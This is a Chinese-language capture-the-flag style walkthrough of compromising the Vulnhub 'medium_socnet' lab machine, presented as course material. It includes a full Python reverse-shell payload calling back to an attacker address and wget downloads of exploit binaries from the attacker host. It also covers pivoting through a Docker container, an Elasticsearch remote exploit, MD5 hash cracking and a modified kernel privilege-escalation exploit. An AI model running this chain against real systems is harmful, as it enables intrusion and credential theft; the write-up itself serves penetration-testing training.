## 	第一周

​	**靶机名称**:Vulnhub------**medium_socnet**

​	**靶机链接**:http://www.vulnhub.com/entry/boredhackerblog-social-network,454/

​	**难度**:*Medium*

​	**攻击机**:Kali Linux

​	**所用工具**:[dirsearch](https://github.com/maurosoria/dirsearch)、[Venom](https://github.com/Dliv3/Venom)

​	**强烈推荐教程**:[我们一起来打靶](https://pqy.h5.xeknow.com/s/2svbaU)

​	![推广](https://tva1.sinaimg.cn/large/008i3skNly1gtez9sj6vrj60u01hdgsv02.jpg)



#### 				主机发现	

​	我们在内网部署了Virtualbox虚拟机靶场,既然在一个局域网内,不妨使用二层的主机发现方式——ARP

​	使用命令`sudo arp-scan -l` 扫描当前局域网内的存活主机

​	如果当前主机存在多网卡现象,可使用参数`-I <interface>`指定要扫描的局域网的网卡

![截屏2021-08-04 下午12.35.27](https://tva1.sinaimg.cn/large/008i3skNly1gt4nfuz98uj31400d878h.jpg)

##### 	虚拟机在哪?!!

​		很快结果出现了,局域网内有这么多设备!

​		怎么识别哪个是靶场虚拟机,哪个是真实的局域网设备呢?

​		别慌,对于每一张真实主机的网卡都会有一个相对应的mac地址

​		通常来说,mac地址是主机在二层网络中的唯一识别码,是由网卡生产商在出厂时烧录在网卡中的

​		但是对于虚拟机来说,它可没有真实的网卡,是由虚拟机创造的虚拟网卡!

​		因此,我们可以通过mac地址的前三格判断是否为虚拟机

> "00:05:69"; //vmware1
>
> "00:0C:29"; //vmware2
>
> "00:50:56"; //vmware3
>
> "00:1c:14"; //vmware4
>
> "00:1C:42"; //parallels1
>
> "00:03:FF"; //microsoft virtual pc
>
> "00:0F:4B"; //virtual iron 4
>
> "00:16:3E"; //red hat xen , oracle vm , xen source, novell xen
>
> "08:00:27"; //virtualbox

​		原文链接：https://blog.csdn.net/weixin_43418664/article/details/83759238

​			很明显,*10.0.0.16*的mac地址*08:00:27:35:5d:bc*是vritualbox的虚拟网卡,看来我们确定了目标

#### 扫描

现在知道了靶机的ip-10.0.0.16,我们还需要知道开放了哪些**端口**、运行哪些**服务**

我们使用大名鼎鼎的扫描工具**nmap**进行扫描

##### 端口扫描

​	`sudo nmap -p- 10.0.0.16`

​	为什么要使用sudo呢?在默认情况下,如果执行时的权限为普通用户会进行正常的端口扫描,而在root权限下则默认使用TCP SYN扫描(参数`-sS`),这样扫描**更隐蔽**,不容易被防火墙检测.

​	使用`-p-`参数进行**全端口扫描**,因为nmap默认只扫描最常见的1000个端口,为了防止错过端口,就使用全端口扫描吧!![截屏2021-08-04 下午12.52.46](https://tva1.sinaimg.cn/large/008i3skNly1gt4nxu0w3oj30t00bewgk.jpg)

由于在本地网络,扫描很快就以迅雷不及掩耳之势完成了.可以发现靶机打开了两个端口,22和5000

##### 服务扫描

知道了端口,我们还要知道在端口上面运行了什么服务,以及服务是什么版本的.

`sudo nmap -p22,5000 -sV 10.0.0.16`使用命令扫描22和5000端口,并使用`-sV`扫描服务的版本

![截屏2021-08-04 下午12.56.42](https://tva1.sinaimg.cn/large/008i3skNly1gt4o25ye6sj315y0ckgpf.jpg)

看来22端口运行着**OpenSSH**服务,版本为6.6.p1,而且我们惊喜的得知了**操作系统**为Ubuntu~

5000端口运行着**http**服务,也就是所谓的**web**服务,值得注意的是此处使用的版本为**Werkzeug** httpd 0.14.1

Werkzeug是一个WSGI**工具包**,是Web框架的底层库,属于**python**的一个模块,仔细观察扫描结果,我们可以发现靶机运行着Python2.7.15的环境,这也许意味着我们后期可以通过**python脚本进行反弹shell**等工作.

#### Web页面

##### 常规测试?

既然5000端口运行着http服务,那我们就去看一看吧

在浏览器输入10.0.0.16:5000打开web页面

![截屏2021-08-04 下午1.03.20](https://tva1.sinaimg.cn/large/008i3skNly1gt4o8u5o0aj31dt0u0gri.jpg)

对首页进行分析,只有一个输入框可以进行**数据输入**

面对**留言**功能,最容易发生的就是**sql注入**和**XSS**,我们进行尝试

![截屏2021-08-04 下午1.06.09](https://tva1.sinaimg.cn/large/008i3skNly1gt4obrhq13j30p60h0gnf.jpg)

进行简单的测试后,我们发现XSS与sql注入似乎都失败了

我们好像遇到了一个瓶颈,现有的功能都测试过了,但是都没有用......

##### 信息收集的魅力~

对于一个web网站,我们可以从已知的方面入手,就像刚才一样测试,但是进攻的方式还有很多,我们不妨再找一条路?

**目录扫描!!!**

既然当前的首页我们找不到漏洞,不如找找其他页面?

目录扫描的工具有很多,此处使用由python编写的工具**dirsearch**

`dirsearch -u "http://10.0.0.16:5000/"`

![截屏2021-08-04 下午1.16.05](https://tva1.sinaimg.cn/large/008i3skNly1gt4om70jnlj315w0h0770.jpg)

很顺利,我们发现了admin文件

对于web应用来说,**寻找敏感目录**是**非常重要**的一步,一定要记住!

![截屏2021-08-04 下午1.19.29](https://tva1.sinaimg.cn/large/008i3skNly1gt4opmo68xj31a40qg0u9.jpg)

此处具有执行代码的功能,奇怪,什么代码???

我们先尝试shell指令

`echo "hello world"`

![截屏2021-08-04 下午1.21.02](https://tva1.sinaimg.cn/large/008i3skNly1gt4or90styj30na0cmdgu.jpg)

居然显示代码执行出错?

看来不是shell指令,那么会是什么呢?

回顾我们之前nmap扫描的结果,这个web使用的是python中的模块搭建的,会不会执行的是python的代码呢?

我们尝试输入python代码

```python
def HH():
	print('HH')
HH()
```

![截屏2021-08-04 下午1.24.13](https://tva1.sinaimg.cn/large/008i3skNly1gt4oujiau2j30na0cmq3n.jpg)

代码运行成功了!

**在进行渗透测试时,一定要学会充分的信息收集,并将所收集到的信息运用到其他地方的测试~**

下一步,我们尝试通过执行python代码反弹shell

先在本地通过`nc -lp 4444`监听4444端口,再在web端执行如下代码

```python
import socket,os,subprocess
RHOST='10.0.0.12'  # Change it
RPORT=4444  # Change it
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # 创建一个TCP-socket对象
s.connect((RHOST,RPORT)) 	# 连接攻击者
os.dup2(s.fileno(),0)		# 复制链接符
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])  # 创建子进程调用SHELL
```

成功获取Shell

我们好幸运啊!!!直接获得了root账户......吗?

![截屏2021-08-04 下午1.38.39](https://tva1.sinaimg.cn/large/008i3skNly1gt4p9l2y4zj31ju0t2qdp.jpg)

`ls`查看当前目录,发现了Dockerfile

#### 危

Docker是一种标准化部署环境的工具,可以勉强理解为虚拟机

我们怎么验证我们是否被困在docker环境内呢

1.查看根目录下是否存在.dockerenv文件夹

`ls /.dockerenv`存在!

 2.查看/proc/1/cgroup文件

`cat /proc/1/cgroup` 

/proc是一个存储进程的文件夹,linux中万物皆为文件,包括进程!

/proc/1指的是操作系统加载时的第一个进程,我们查看后居然发现了Docker!,并且可以获得docker镜像的hash.

这下可咋整!本以为得到了root权限,结果却在docker容器中??!真是白高兴一场...

#### 山重水复疑无路、柳暗花明又一村~

虽然这只是个docker,但我们也不放做一些信息收集



![截屏2021-08-04 下午2.34.53](https://tva1.sinaimg.cn/large/008i3skNly1gt4qw3hnk5j30w40gctd8.jpg)

发现了**内网环境**,而且这个内网还挺大!

怎么对内网的环境进行扫描呢?

我们不妨使用Shell执行一下本地自动化的ping探测

`for i in $(seq 254);do ping -c 1 172.17.0.$i;done`

Ps:其实应该扫描CIDR为16的内网范围,但是范围太大了,就偷个小懒

扫描后发现只有172.17.0.1、172.17.0.2、172.17.0.3是可以ping通的

##### 代理

没错!就是代理

我们通过在这台docker上设置代理,以此为跳板,将攻击机发出的数据通过这台docker进行中转,最终发到内网中!

同样,内网代理的工具有很多,我们这里使用Venom进行代理

怎么将代理程序传到靶机上呢?

我们在本地通过python启动**http服务**(ip:10.0.0.12),在靶机上使用**wget**下载文件

![截屏2021-08-04 下午2.45.15](https://tva1.sinaimg.cn/large/008i3skNly1gt4r6v5im8j319g09c76d.jpg)

![截屏2021-08-04 下午2.48.05](https://tva1.sinaimg.cn/large/008i3skNly1gt4r9skm5tj310s07o75p.jpg)

之后使用Venom在攻击机运行管理端,设置`-lport 8111`即监听端口8111![截屏2021-08-04 下午2.51.22](https://tva1.sinaimg.cn/large/008i3skNly1gt4rd78avdj30lg0dg0ug.jpg)

![截屏2021-08-04 下午2.52.01](https://tva1.sinaimg.cn/large/008i3skNly1gt4rdvohquj30su0mu0wm.jpg)

在靶机上赋予代理端程序可执行权限,运行程序连接管理端

成功链接

![截屏2021-08-04 下午2.53.29](https://tva1.sinaimg.cn/large/008i3skNly1gt4rfm4eoij30x409umyx.jpg)

使用`show`显示当前代理节点,使用`goto 1`进入刚才连接的靶机节点

使用`socks 3388`在本地3388端口打开一个socks5的代理通道,可以通过此代理与靶机的内网环境进行数据传输

创建好代理后,我们通过proxychains这个软件连接代理

首先通过`sudo vi /etc/proxychains4.conf `修改proxychains的配置文件

![截屏2021-08-04 下午2.56.33](https://tva1.sinaimg.cn/large/008i3skNly1gt4rilwft3j30e806e0t8.jpg)

将tor的代理在行首添加`#`注释掉,在末尾添加`socks5 127.0.0.1 3388`设置代理

到此,代理的设置就完毕啦!

##### 鬼子进村~

有了代理后,我们就可以对内网环境进行扫描了

在要执行的命令前加上`proxychains`使用代理环境

`proxychains nmap 172.17.0.1-3`

![截屏2021-08-04 下午3.41.29](https://tva1.sinaimg.cn/large/008i3skNly1gt4stcu36hj30e80gwdi0.jpg)

对于新出现的端口9200,似乎很有意思,我们扫描一下

`proxychains nmap -sV -p 9200 172.17.0.2`



![截屏2021-08-04 下午3.43.11](https://tva1.sinaimg.cn/large/008i3skNly1gt4sv4faelj31f602mgmc.jpg)

神奇的软件出现了,Elasticsearch是一个web应用,历史漏洞很多.

找到了一个应用,那我们就来找找看有没有漏洞吧~

只不过这一次不一样,我们不用自己找,而是来搜索一下以前的大佬们对此软件有没有相应的payloads

使用`searchsploit Elasticsearch `搜索exploit-db漏洞数据库

​			Ps:[exploit-db](https://www.exploit-db.com/)是一个大型的漏洞数据库网站,里面有大量已知漏洞的信息以及利用exp,建议各位去浏览学习,**searchsploit**是其便于搜索的工具

![截屏2021-08-04 下午3.51.48](https://tva1.sinaimg.cn/large/008i3skNly1gt4t43gztzj31i80d6wjb.jpg)

左侧是漏洞的描述信息,右侧是存储的路径

由于我们使用的是kali Linux,自动安装searchsploit,漏洞存储在/usr/share/exploitdb/exploits/中

所以我们使用`cp /usr/share/exploitdb/exploits/linux/remote/36337.py .`

拷贝exp到当前目录![截屏2021-08-04 下午3.56.58](https://tva1.sinaimg.cn/large/008i3skNly1gt4t9igj4uj310r0u00yk.jpg)

成功~

此处介绍一个常见bug![img](https://tva1.sinaimg.cn/large/008i3skNly1gthb2aygd8j60tq0k5grn02.jpg)

​															原文https://www.anquanke.com/post/id/204066

原因是服务里面没有数据，所以不能通过search来搜索进而执行命令.

我们插入一条数据:

```shell
proxychains curl -XPOST 'http://172.17.0.2:9200/twitter/user/yren' -d '{ "name" : "Wu" }'
```

再次执行exp就可以啦~



执行ls命令,发现有一个好玩的东西,passwords文件!

我们来康康有什么!~![截屏2021-08-04 下午3.58.03](https://tva1.sinaimg.cn/large/008i3skNly1gt4tam27dbj31fs09cmzv.jpg)

哦~好多账号和密码,可惜是md5加密后的

我们在网上搜索md5在线解密,获得密码的原文

或者,文件提示密码格式为4个数字加四个小写字母

我们可以使用hashcat进行破解~

`ashcat -m 0 -a 3 3f8184a7343664553fcb5337a3138814 ?d?d?d?d?l?l?l?l --force`

获取到用户名与密码后,我们来看看有什么用吧~

注意到前文的端口扫描,发现有22ssh服务开启,我们尝试登陆

经过尝试后,发现只有john账户才可以登录,使用命令`proxychains ssh john@172.17.0.1`进行登录~

![截屏2021-08-04 下午4.21.40](https://tva1.sinaimg.cn/large/008i3skNly1gt4tz7gxlij31fs082tat.jpg)

登录账户后,日常看一看账户信息,很可惜的是没有sudo权限,不然我们已经拥有密码,可以直接拥有root权限

在使用`uname -a`查看内核信息时出现了惊喜,3.13.0的内核?!现在的内核已经到了5.x

这么老的内核可能会有漏洞

我们再一次使用`searchsploit Linux Kernel 3.13.0`搜索漏洞,搜到一堆漏洞,但大多数都是.c结尾的c文件,需要编译后才可使用

##### 没有gcc??!!

通过`wget http://10.0.0.12/exp.c`获得exp后,尝试使用gcc进行编译

**居然没有gcc?!**

这可就麻烦了,没有编译软件,怎么生成可执行二进制文件呢?

思索过后,我决定在本地将exp进行编译

尝试过后,我发现因为环境不一样,大部分exp在本地是无法编译的,

有一个exp可以在本地编译,但是其中代码中有调用了gcc

![截屏2021-08-04 下午4.46.37](https://tva1.sinaimg.cn/large/008i3skNly1gt4up4ul4qj31140o8gp8.jpg)

#### 那怎么办呢?改呗!

分析此处逻辑,其实就是调用了gcc生成一个动态链接库进行使用

那我们干脆在本地把动态链接库也准备好!

把此处相关代码进行注释,重新编译

寻找文件名为`ofs-lib.so`的动态链接库,我们使用`locate ofs-lib.so`对文件进行定位

![截屏2021-08-04 下午4.49.48](https://tva1.sinaimg.cn/large/008i3skNly1gt4usg3xenj311405g0u5.jpg)

哈哈,找到啦~

我们开启`python3 -m http.server 80`进行监听,同时在靶机将编译好的exp和ofs-lib.so下载下来

因为exp中的代码是将ofs-lib.so生成在/tmp路径下的,所以我们将exp与ofs-lib.so移动到/tmp下

别忘了用`chmod +x exp`给exp加上可执行权限,然后使用`./exp`执行

PWN~~![截屏2021-08-04 下午5.06.26](https://tva1.sinaimg.cn/large/008i3skNly1gt4v9rp6jyj31140dmtb1.jpg)

### 附录-另一个内核提权exp:

在进行本次渗透提权过程中,我们发现了内核的版本很低,在searchsploit搜索漏洞exp时发现需要gcc.如上,因此我们开始了漫漫提权路.

虽然这一路是艰辛的,但是我们学习到了不要拘泥于有限的脚本,学会去更改exp.

但是呢~我们也不一定非要修改这一个exp啊,我们去网上再找一个不香吗~~

感谢"我们一起来打靶"学员交流群中的“晴天”同学为我们找到了便捷的linux内核提权exp,同样可以用在ubuntu提权.

所附exp:`CVE-2021-3493.c`

所附文档:`Linux-Kernel-Privilege-Escalation-Review-ZH.doc`(中文版~请各位放心阅读)

### 总结

我们首先进行二层主机发现,识别虚拟机

然后进行端口扫描,发现了web服务

在对web服务简单检测后无果,我们进行目录扫描,发现了敏感目录/admin

通过先前的扫描得知python环境,在/admin下通过命令执行的功能用python反弹了一个shell

正当我们开心时,发现当前在docker容器中,于是通过内网扫描、代理进入内网

对内网其它机器进行扫描后,我们发现了Elasticsearch服务,通过searchsploit获得相应exp,成功获得shell

在对文件进行简单查看后,发现了特殊的passwords文件,获得了ssh账户与加密的密码

通过在线平台或hashcat我们破解了hash密码

使用ssh成功登陆到正常的账号,而不是docker:)

获得普通用户权限后,还需要进行本地提权

uname -a发现内核版本极旧,于是我们搜索exp

但在此遇到了一个困难,靶机没有gcc,没办法执行编译,我们只能先编译

因此,很多exp出现问题,唯一一个可用的却在内部调用了gcc

在分析后,我们通过注释响应代码,上传其需要的ofs-lib.so文件,运行exp,成功获得shell

**祝各位学习愉快~(滑稽**



### 致谢

**~晴天☀️~**

